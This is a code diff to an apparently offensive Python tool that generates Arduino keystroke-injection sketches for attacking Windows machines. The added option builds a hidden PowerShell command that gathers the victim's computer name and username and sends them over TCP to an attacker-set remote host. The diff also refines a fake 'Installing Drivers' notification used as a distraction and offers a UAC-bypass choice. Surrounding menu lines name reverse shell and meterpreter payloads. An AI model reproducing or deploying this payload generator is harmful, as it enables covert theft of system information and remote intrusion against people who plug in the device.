@@ -32,7 +32,8 @@ def WinMenu():
   menu['7']="Change DNS Entry in Hostfile for Windows"
   menu['8']="Download File and Place on Current User's Desktop for Windows"
   menu['9']="Reverse TCP CMD prompt for Windows"
-  menu['10']="windows/meterpreter/reverse_https in Powershell"
+  menu['10']="windows/meterpreter/reverse_https in Powershell for Windows"
+  menu['11']="Get username and computer name and send to a remote listener for Windows"
   menu['42']="Return to main menu"
   menu['99']="Exit"
   
@@ -63,7 +64,9 @@ def WinMenu():
     elif selection == '9':
       WinOption9()
     elif selection == '10':
-	  WinOption10()
+	    WinOption10()
+    elif selection == '11':
+      WinOption11()
     elif selection == '42': 
       coreUtils.clearScreen()	
       break
@@ -74,32 +77,53 @@ def WinMenu():
 	  
 def notificationBubble():
 
+  title = "Installing Drivers"
+  message = "Please do not remove the device"
   while True:
-  
-    answer = raw_input("Do you want to include a notifiction bubble as a distraction? (Y/n/?):  ")
+
+    answer = raw_input("Do you want to include a notifiction bubble as a distraction? Press Enter for default Yes (Y/n/?):  ")
     
     if answer in ('Y','y','yes','Yes','YES'):
-      buffer = "void bubblePopup(){\n"
-      buffer += "  Keyboard.println(\"wlrmdr.exe -s 60000 -f 1 -t \\\"Installing Drivers\\\" -m \\\"Please do not remove the device\\\"\");\n"
-      buffer += "  delay(100);\n"
-      buffer += "  pressEnter();\n"
-      buffer += "  delay(750);\n"
-      buffer += "}\n"
     
-      setting = 'Enabled'
+      while True:
+        print "\n"
+        print "Current notification bubble title is: " + title
+        print "Current notification bubble message is: " + message
+        
+        print "\n"
+        customize = raw_input("Do you want to change the notification bubble text? (Y/n):")
+        
+        if customize in ('Y','y','yes','Yes','YES',''):
+          print "\n"
+          title = raw_input("Please enter the Title of the notification bubble ->  ")
+          message = raw_input("Please enter the Message of the notification bubble ->  ")
+        
+        elif customize in ('N','n','no','No','NO',''):
       
-      return buffer, setting
+          buffer = "void bubblePopup(){\n"
+          buffer += "  Keyboard.println(\"wlrmdr.exe -s 60000 -f 1 -t \\\""+title+"\\\" -m \\\""+message+"\\\"\");\n"
+          buffer += "  delay(100);\n"
+          buffer += "  pressEnter();\n"
+          buffer += "  delay(750);\n"
+          buffer += "}\n"
+        
+          setting = 'Enabled'
+          
+          return buffer, setting
+         
+      break
     
     elif answer in ('N','n','no','No','NO'):
       buffer = "void bubblePopup(){\n"
       buffer += "}\n"
     
       setting = 'Disabled'
-      
       return buffer, setting
+      
     elif answer == '?':
       nfoCore.bubbleInfo()
     else:
+      print "\nThat is not a valid option, enabling the default option Notification Bubble"
       buffer = "void bubblePopup(){\n"
       buffer += "  Keyboard.println(\"wlrmdr.exe -s 60000 -f 1 -t \\\"Installing Drivers\\\" -m \\\"Please do not remove the device\\\"\");\n"
       buffer += "  pressEnter();\n"
@@ -109,12 +133,13 @@ def notificationBubble():
       setting = 'Enabled'
       
       return buffer, setting
+           
   
 def checkUACBypass():
 
   while True:
 
-	  bypassUACoption = raw_input("Please select a bypass UAC method:\n 1.  No UAC Bypass\n 2.  https://goo.gl/fPl4tm for bypass(no UAC popup)\n 3.  run As (UAC popup visable)\n ?.  For more information\n Presss Enter for default (None): ")
+	  bypassUACoption = raw_input("Please select a bypass UAC method:\n 1.  No UAC Bypass\n 2.  https://goo.gl/fPl4tm for bypass(no UAC popup)\n 3.  run As (UAC popup visable)\n ?.  For more information\n Press Enter for default (None): ")
 
 	  if bypassUACoption == "":
 		bypassUACoption = "1"
@@ -213,13 +238,15 @@ def BypassUACAdmin():
 
 def WinWriteFile(fileName,payloadFunc,bypassUAC,payload, bubble):
 
-  buffer = "#include <HID-Project.h>\n"
+  buffer = "//This Arduino Sketch was generated with the OverThruster tool, located here: https://github.com/RedLectroid/OverThruster\n\n"
+  buffer += "#include <HID-Project.h>\n"
   buffer += "void setup() {\n"
   buffer += "  Keyboard.begin();\n"
   buffer += "  hurryUp();\n"
   buffer += "  killCaps();\n"
   buffer += "  bypassUAC();\n"
   buffer += "  bubblePopup();\n"
+  buffer += "  //THIS DELAY IS IMPORTANT, AND MAY NEED TO BE MODIFIED FOR YOUR TARGET\n"
   buffer += "  delay(1000);\n"
 
   buffer += "  " + payloadFunc
@@ -1371,3 +1398,115 @@ def WinOption10():
 
     coreUtils.msfRCfile(remoteIP,remotePort,'windows/meterpreter/reverse_https',RCfile)
     WinWriteFile(fileName,payloadFunc,bypassUAC, payload,bubble)
+
+    
+def WinOption11():
+
+  done = False
+  looper = False
+  remoteIP=""
+  remotePort=""
+  fileName=""
+  bypassUACoption=""
+  bubbleSetting=""
+
+  while looper != True:
+  
+    coreUtils.clearScreen()
+    print "********************************************************************************************"
+    print "*                                                                                          *"
+    print "*                             UserName and Computer Name                                   *"
+    print "*  This payload will grab the UserName and Computer Name of the who plugged in the device  *"
+    print "*                     Options are: 1. remote IP 2. Listening Port                          *"
+    print "*                                                                                          *"
+    print "*                                                                                          *"
+    print "********************************************************************************************"
+    print "\n"
+
+    menu = {}
+    menu['0'] = "Info"
+    menu['1'] = "Set the IP of the remote server"
+    menu['2'] = "Set the listening port of the remote server"
+    menu['3'] = "Set bypassUAC mode"
+    menu['4'] = "Set Arduino sketch filename"
+    menu['5'] = "Set notification bubble option"
+    menu['6'] = "Write Arduino sketch"
+    menu['42']= "Return to previous menu"
+    menu['99']= "Exit"
+
+    options=menu.keys()
+    options.sort(key=int)
+    for entry in options: 
+      print entry, menu[entry]
+
+    print "\n\n"
+    if remoteIP != "":
+      print "The IP of the remote server is set to ->  " + remoteIP
+    if remotePort != "":
+      print "The listening port of the remote server is set to ->  " + remotePort
+    if bypassUACoption != "":
+      print "bypassUAC technique set to ->  " + bypassUACoption
+    if bubbleSetting != "":
+      print "Notification bubble set to -> " + bubbleSetting
+    if fileName != "":
+      print "Arduino filename set to ->  " + fileName
+    
+    selection=raw_input("\nPlease Select: ") 
+
+    if selection == '1':
+      remoteIP = raw_input("Please enter the IP of the server to send the data to: ")
+    elif selection == '2':
+      remotePort = raw_input("Please enter the port the server will be listening on: ")
+    elif selection == '3': 
+      bypassUACoption,bypassUAC = checkUACBypass()
+    elif selection == '4':
+      fileName = coreUtils.getFileName('userAndComputer.ino')
+    elif selection == '5':
+      bubble, bubbleSetting = notificationBubble()
+    elif selection == '6':
+      if done == False:
+        print "\nYou have not set all the options"
+        raw_input("Press Enter to return to the menu and set all the options")
+      else:
+        looper = True
+    elif selection == '42': 
+      coreUtils.clearScreen()	
+      break
+    elif selection == '99':
+      exit()
+    elif selection == '0':
+      nfoCore.Win11info()
+    else: 
+      print "\n\n***That is not a valid option!***\n\n" 
+      
+    if remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
+      done = True
+    
+  if done == True and looper == True:  
+    payload = "void userAndComputer(){\n"
+    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
+      payload += "  Keyboard.print(\"$pc = $env:computername;$user = $env:UserName; $Message = $pc + '     ' + $user; $port=" + remotePort +"; $remoteHost=\'"+ remoteIP 
+    else:    
+      payload += "  Keyboard.print(\"powershell -w Hidden \\\"$pc = $env:computername;$user = $env:UserName; $Message = $pc + '     ' + $user; $port=" + remotePort +"; $remoteHost=\'"+ remoteIP 
+    payload += "\'; $socket = new-object System.Net.Sockets.TcpClient($remoteHost, $port); $data = [System.Text.Encoding]::ASCII.GetBytes($Message);"
+    if bypassUACoption == "https://goo.gl/fPl4tm (no visible popup)":
+      payload += " $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;\");\n"
+    else:
+      payload += " $stream = $socket.GetStream(); $stream.Write($data,0,$data.Length);exit;\\\"\");\n"
+    payload += "  pressEnter();\n"
+    if bypassUACoption == "run As (visible popup)":
+      payload += "  Keyboard.println(\"exit\");\n"
+      payload += "  delay(100);\n"
+      payload += "  pressEnter();\n"
+      payload += "  Keyboard.println(\"exit\");\n"
+      payload += "  delay(100);\n"
+      payload += "  pressEnter();\n"
+    elif bypassUACoption == "None":
+      payload += "  Keyboard.println(\"exit\");\n"
+      payload += "  delay(100);\n"
+      payload += "  pressEnter();\n"     
+    payload += "}\n"
+
+    payloadFunc = "userAndComputer();\n"
+
+    WinWriteFile(fileName,payloadFunc,bypassUAC,payload,bubble)
